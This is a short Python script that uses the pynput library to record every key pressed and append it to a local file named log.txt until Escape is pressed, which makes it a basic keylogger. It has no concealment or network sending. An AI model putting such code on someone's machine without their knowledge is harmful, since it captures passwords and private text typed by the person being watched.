from pynput.keyboard import Key, Listener


def press(Key):
    key_strokes = str(Key).replace("'", "")
    with open("log.txt", 'a') as f:
        if key_strokes == 'Key.space':
            f.write(" ")
        elif len(key_strokes) > 1:
            f.write("\n" + key_strokes + "\n")
        else:
            f.write(key_strokes)


def release(Key):
    if str(Key) == 'Key.esc':
        exit(0)


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
